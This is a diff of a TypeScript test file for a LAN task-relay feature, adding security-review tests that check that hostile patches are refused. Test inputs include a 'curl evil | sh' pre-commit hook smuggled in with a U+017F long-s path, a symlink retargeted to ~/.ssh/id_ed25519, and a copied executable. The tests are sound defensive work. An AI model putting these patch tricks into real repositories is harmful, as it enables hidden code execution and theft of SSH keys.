@@ -396,7 +396,7 @@ if (process.platform === "darwin") {
   const codes: number[] = []; for (let i = 0; i < 40; i++) { const m1 = new Handshake("KK", true, M, K.pub).writeMessage(Buffer.from("{}")); codes.push((await w.handle(req("/lan/v1/kk", m1), "10.2.2.2")).status); }
   ok(codes.slice(-5).every((c) => c === 429), "unauthenticated KK attempts from one address are cut off (before trying every allowlisted key) after a few", JSON.stringify(codes.slice(-8)));
   w.stop(); }
-// 7. rounds only is for providers that report no cost
+// 7. rounds only is the taker's choice for any provider (Claude and Studio's default included): the take carries no dollar cap
 { const runner = (): LanRunner => ({ workflows: () => [{ id: "documents", version: 1, name: "Documents", defHash: "a".repeat(64), eligible: true, why: [], notRun: [], staffing: null }], start: async () => { throw new Error("no"); }, status: () => null, output: async () => { throw new Error("no"); }, cancel: () => {} });
   const mk3 = (name: string) => new Lan({ dataDir: mkdtempSync(join(tmpdir(), `crew-lan-r3r-${name}-`)), runner: runner(), bind: "127.0.0.1", port: 0, discovery: null });
   const A = mk3("a"), B = mk3("b"); A.setEnabled(true); B.setEnabled(true); B.openIntro(1);
@@ -404,8 +404,7 @@ if (process.platform === "darwin") {
   A.dispatch({ to: B.id.key, title: "t", briefing: "x" }); await until(() => B.view().items.length === 1, 5000);
   const d = B.view().items[0], t = B.thread(d.thread)!;
   let e1 = ""; try { await B.approve(d.id, { workflow: "documents", seen: B.seenHash(t, t.rounds[0]), roundsOnly: true, rounds: 3, provider: "claude" }); } catch (e: any) { e1 = e.message; }
-  let e2 = ""; try { await B.approve(d.id, { workflow: "documents", seen: B.seenHash(t, t.rounds[0]), roundsOnly: true, rounds: 3, provider: null }); } catch (e: any) { e2 = e.message; }
-  ok(/rounds only/i.test(e1) && /rounds only/i.test(e2), "a rounds-only cap is refused for a provider that reports its cost, and for an unnamed default", `${e1} | ${e2}`);
+  ok(!e1 && t.rounds[0].take?.cap.usd === null && t.rounds[0].take?.cap.rounds === 3, "a rounds-only cap may be chosen for Claude, a provider that reports its cost (no dollar cap, three rounds)", e1 || JSON.stringify(t.rounds[0].take?.cap));
   A.close(); B.close(); }
 // 8. records are pruned: answered items and closed threads do not grow without end
 { const { Lan: L } = await import("../src/lan/relay");
@@ -441,4 +440,92 @@ if (process.platform === "darwin") {
     ok(id1.store === "keychain" && id2.key === id1.key && [...db.keys()].every((k) => k.startsWith("crew-studio-lan-identity/")), "opted in, the identity is kept under the Keychain service crew-studio-lan-identity and read back");
     const hex = Buffer.from(id1.priv).toString("hex"); ok(!calls.some((c) => c.argv.join(" ").includes(secret) || c.argv.join(" ").includes(hex)) && calls.some((c) => c.stdin.includes(`-w ${hex}`)) && !readFileSync(join(data, "lan", "identity.key"), "utf8").includes(secret) && JSON.parse(readFileSync(join(data, "lan", "identity.key"), "utf8")).store === "keychain", "the private key goes to the keychain tool on stdin, never on its argv; the key file is only a marker");
   } finally { keychainSpawn.run = real; } }
+// ---------- review round 4 (security review probes): each expects the fixed behaviour ----------
+// R4-1. the protected-path check folds case like JS toLowerCase, but APFS (case-insensitive) also folds U+017F (long s) to "s":
+//       a patch path git keeps distinct lands on the protected file the moment the dispatcher checks the branch out
+{ const { lanApplier } = await import("../src/lan/apply");
+  const { writeRefused } = await import("../src/lan/paths");
+  const root = mkdtempSync(join(tmpdir(), "crew-lan-r4-")), repo = join(root, "repo"); mkdirSync(repo);
+  const g = (cwd: string, ...a: string[]) => { const r = Bun.spawnSync(["git", "-c", "user.name=T", "-c", "user.email=t@example.invalid", "-c", "core.hooksPath=/dev/null", ...a], { cwd, stdout: "pipe", stderr: "pipe" }); if (r.exitCode) throw new Error(r.stderr.toString()); return r.stdout.toString(); };
+  g(repo, "init", "-q", "-b", "main"); mkdirSync(join(repo, ".husky")); writeFileSync(join(repo, ".husky/pre-commit"), "npm test\n"); writeFileSync(join(repo, "AGENTS.md"), "rules\n");
+  writeFileSync(join(repo, "run.sh"), "#!/bin/sh\necho hi\n"); chmodSync(join(repo, "run.sh"), 0o755); writeFileSync(join(repo, "README.md"), "r\n"); symlinkSync("README.md", join(repo, "docs-link"));
+  g(repo, "add", "-A"); g(repo, "commit", "-qm", "base");
+  const apply = lanApplier({ dataDir: join(root, "data"), project: () => ({ path: repo, base: "main" }) });
+  let n = 0; const tryApply = (patch: string) => { try { return { ok: true as const, branch: apply({ project: "p", patch, branch: `lan-untrusted/r4-r${++n}` }).branch }; } catch (e: any) { return { ok: false as const, why: String(e?.message ?? e) }; } };
+  const nf = (p: string, body: string) => `diff --git a/${p} b/${p}\nnew file mode 100644\n--- /dev/null\n+++ b/${p}\n@@ -0,0 +1 @@\n+${body}\n`;
+  ok(["AGENTſ.md", ".huſky/pre-commit", ".vſcode/tasks.json", ".mcp.jſon", "ſetup.py", ".gitattributeſ"].every((x) => writeRefused(x)), "a protected name spelled with U+017F (APFS folds it to s) is refused at write time");
+  const husky = tryApply(nf(".huſky/pre-commit", "curl evil | sh"));
+  let onDisk = ""; if (husky.ok) { const wt = join(root, "wt"); g(repo, "worktree", "add", "-q", wt, husky.branch); onDisk = readFileSync(join(wt, ".husky/pre-commit"), "utf8"); }
+  ok(!husky.ok, "a patch adding .huſky/pre-commit is refused (checked out on APFS it overwrites .husky/pre-commit, which the dispatcher's own git commit runs)", husky.ok ? `applied; .husky/pre-commit after checkout: ${JSON.stringify(onDisk)}` : husky.why);
+  // R4-2. an existing symbolic link keeps its mode, so retargeting it is no mode change and no new link
+  const link = tryApply(`diff --git a/docs-link b/docs-link\nindex ${g(repo, "rev-parse", "--short=7", "HEAD:docs-link").trim()}..1234567 120000\n--- a/docs-link\n+++ b/docs-link\n@@ -1 +1 @@\n-README.md\n\\ No newline at end of file\n+../../../.ssh/id_ed25519\n\\ No newline at end of file\n`);
+  ok(!link.ok, "a patch retargeting an existing symbolic link (outside the project) is refused", link.ok ? `applied: docs-link -> ${g(repo, "cat-file", "blob", `${link.branch}:docs-link`)}` : link.why);
+  // R4-3. a copy (or rename) of an existing executable is a new path with mode 100755 and no "create mode" line
+  const copy = tryApply(`diff --git a/run.sh b/lib/new.sh\nsimilarity index 50%\ncopy from run.sh\ncopy to lib/new.sh\n--- a/run.sh\n+++ b/lib/new.sh\n@@ -1,2 +1,2 @@\n #!/bin/sh\n-echo hi\n+curl evil | sh\n`);
+  ok(!copy.ok, "a copy of an executable to a new path with new content is refused (only plain 100644 new files)", copy.ok ? `applied: ${g(repo, "ls-tree", copy.branch, "lib/new.sh").trim()}` : copy.why); }
+// R4-4. under a rounds-only cap every paid round of the Task counts, whatever its provider: a Claude judge or a staffed
+//       Claude node is admitted only while rounds are left, and none escapes the count
+{ const run: any = { id: "R-41", params: { _lan: JSON.stringify({ item: "i", usd: null, rounds: 5 }), _tainted: "lan" }, nodes: {}, ctx: {} };
+  let n = 0; const agents: any = { jobs: new Map(), run: async (o: any) => ({ id: `J-${++n}`, ref: o.ref, status: "done", provider: o.provider, cost: { usd: 40 } }) };
+  const E: any = { get: () => run, deps: { agents, log: null }, beforeStart: {}, kinds: {}, policy: () => null, exec: async () => ({}), briefSkeleton: () => "" };
+  installLanProfile(E);
+  let admitted = 0; for (let i = 0; i < 8; i++) { try { await agents.run({ ref: run.id, kind: i % 2 ? "judge:x" : "agent", provider: i % 3 ? "claude" : { id: "codex" }, sandbox: { writes: [] }, tools: [] }); admitted++; } catch {} }
+  ok(admitted === 5 && run.ctx.lanRounds.length === 5, "under a rounds-only cap of 5, five paid rounds of any provider (Claude judges and nodes, Codex) are admitted and the rest refused; every one is counted", `${admitted} admitted, ${run.ctx.lanRounds?.length} recorded`); }
+// R4-5. a round still open when Studio stopped is never settled: after the restart its dollars are neither counted nor unknown
+{ const { capRefusal } = await import("../src/lan/profile");
+  const run: any = { id: "R-42", params: {}, ctx: { lanRounds: [{ n: 1, at: new Date().toISOString(), job: null, usd: null, ended: false }] } };
+  const why = capRefusal({}, run, { item: "i", usd: 1, rounds: 5 });
+  ok(why !== null, "after a restart, a round admitted before it and never settled makes the dollars unknown (the $ cap cannot hold)", "admitted: the interrupted round's dollars count as $0"); }
+
+// R4-6. the dispatcher withdraws while the assigned Task is starting: the cancel skips "(starting)", and the check after the
+//       start looks only at revoke and freeze, so the withdrawn work runs on
+{ const starts: string[] = [], cancelled: string[] = []; let gate: () => void = () => {}; const opened = new Promise<void>((res) => { gate = res; });
+  const runner = (): LanRunner => ({ workflows: () => [{ id: "documents", version: 1, name: "Documents", defHash: "a".repeat(64), eligible: true, why: [], notRun: [], staffing: null }],
+    start: async () => { await opened; const id = `R-W${starts.length + 1}`; starts.push(id); return { run: id, workflow: { id: "documents", version: 1, defHash: "a".repeat(64) } }; },
+    status: () => ({ state: "running", result: null, spent: { usd: 0, rounds: 0 }, stopped: null }), output: async () => { throw new Error("no"); }, cancel: (id) => { cancelled.push(id); } });
+  const mk2 = (name: string) => new Lan({ dataDir: mkdtempSync(join(tmpdir(), `crew-lan-r4-${name}-`)), runner: runner(), bind: "127.0.0.1", port: 0, discovery: null });
+  const A = mk2("a"), B = mk2("b"); A.setEnabled(true); B.setEnabled(true); B.openIntro(1);
+  const ia = await A.startIntro("127.0.0.1", B.wire.port); const ib = B.view().intros[0];
+  A.confirmIntro(ia.id, ib.sas, "B"); B.confirmIntro(ib.id, ia.sas, "A");
+  const th = A.dispatch({ to: B.id.key, title: "t", briefing: "write a note" }); await until(() => B.view().items.length === 1, 5000);
+  const d = B.view().items[0], t = B.thread(d.thread)!;
+  await B.approve(d.id, { workflow: "documents", seen: B.seenHash(t, t.rounds[0]), rounds: 3, usd: 1 });
+  await until(() => A.view().items.some((i: any) => i.kind === "take"), 5000);
+  await A.approve(A.view().items.find((i: any) => i.kind === "take").id);
+  await until(() => B.view().items.some((i: any) => i.kind === "assign"), 5000);
+  const pending = B.approve(B.view().items.find((i: any) => i.kind === "assign").id).catch((e: any) => e);
+  A.withdraw((th as any).id ?? t.id);
+  await until(() => B.thread(t.id)?.state === "withdrawn", 5000).catch(() => {});
+  gate(); await pending;
+  ok(B.thread(t.id)?.state === "withdrawn" && starts.length === 1 && cancelled.includes(starts[0]), "work the dispatcher withdrew while its Task was starting is stopped once it has started", JSON.stringify({ state: B.thread(t.id)?.state, starts, cancelled })); }
+
+// R4-7. the "(starting)" marker of an assignment is never written to the state file, and a stale one is cleared on load
+{ const { Lan: L } = await import("../src/lan/relay");
+  const dir = mkdtempSync(join(tmpdir(), "crew-lan-r4-start-")); const none: any = { workflows: () => [], start: async () => { throw new Error(); }, status: () => null, output: async () => { throw new Error(); }, cancel: () => {} };
+  const x = new L({ dataDir: dir, runner: none, bind: "127.0.0.1", port: 0, discovery: null });
+  const st: any = (x as any).st; st.threads.push({ id: "t-start-1", owner: "o", peer: "p", title: "", acceptance: [], suggested: null, state: "open", steps: [], rounds: [{ n: 1, fence: "f", briefing: { hash: "h", size: 1, entry: "e" }, take: null, assign: null, result: null, run: { id: "(starting)", state: "starting", result: null, started: new Date().toISOString(), stopped: null } }] });
+  x.flushState(); x.close();
+  ok(!readFileSync(join(dir, "lan", "state.json"), "utf8").includes("(starting)"), "the marker of an assignment being started is never written to the state file");
+  const raw = JSON.parse(readFileSync(join(dir, "lan", "state.json"), "utf8")); raw.threads[0].rounds[0].run = { id: "(starting)", state: "starting", result: null, started: "x", stopped: null };
+  writeFileSync(join(dir, "lan", "state.json"), JSON.stringify(raw));
+  const y = new L({ dataDir: dir, runner: none, bind: "127.0.0.1", port: 0, discovery: null });
+  ok(y.thread("t-start-1")?.rounds[0].run === null, "a stale starting marker (a crash mid-start) is cleared when the state is loaded"); y.close(); }
+// R4-8. the unauthenticated-KK limiter: a full table evicts its oldest entry (never all blocks), the window starts at the 8th failure, IPv6 counts per /64
+{ const { LanWire } = await import("../src/lan/wire"); const K = generateKeyPair(), M = generateKeyPair();
+  const w = new LanWire({ me: () => K, allowlist: () => [], introOpen: () => false, self: () => ({ name: "K", port: 1 }), request: async () => null, introduced: () => {} });
+  w.start("127.0.0.1", 0); const port = w.port;
+  const kk = (ip: string) => { const b = new Handshake("KK", true, M, K.pub).writeMessage(Buffer.from("{}")); return w.handle(new Request(`http://127.0.0.1:${port}/lan/v1/kk`, { method: "POST", body: b, headers: { host: `127.0.0.1:${port}`, "content-type": "application/octet-stream", "content-length": String(b.length) } }), ip).then((r) => r.status); };
+  for (let i = 0; i < 8; i++) await kk("10.9.9.9");
+  ok(await kk("10.9.9.9") === 429, "after eight unauthenticated KK messages an address is cut off");
+  { // the minute starts at the eighth failure, not at the first: seven failures 50 s ago, the eighth now, then 15 s pass
+    const ff: Map<string, any> = (w as any).kkFails; for (let i = 0; i < 7; i++) await kk("10.6.6.6");
+    ff.get("10.6.6.6").at -= 50_000; await kk("10.6.6.6"); const e = ff.get("10.6.6.6"); e.at -= 15_000; if (e.blocked) e.blocked -= 15_000;
+    ok(await kk("10.6.6.6") === 429, "the cut-off's minute starts at the eighth failure (15 s after it, still cut off)"); }
+  const fails: Map<string, any> = (w as any).kkFails; for (let i = 0; i < 4200; i++) fails.set(`10.8.${(i >> 8) & 255}.${i & 255}`, { at: Date.now(), n: 1 });
+  await kk("10.7.7.7");
+  ok(await kk("10.9.9.9") === 429, "filling the limiter's table evicts its oldest entries, never the blocks it holds");
+  for (let i = 0; i < 8; i++) await kk(`2001:db8:1:2::${i + 1}`);
+  ok(await kk("2001:db8:1:2::ff") === 429, "IPv6 addresses count per /64: a host cannot walk its own prefix to get around the limit");
+  w.stop(); }
+
 end();
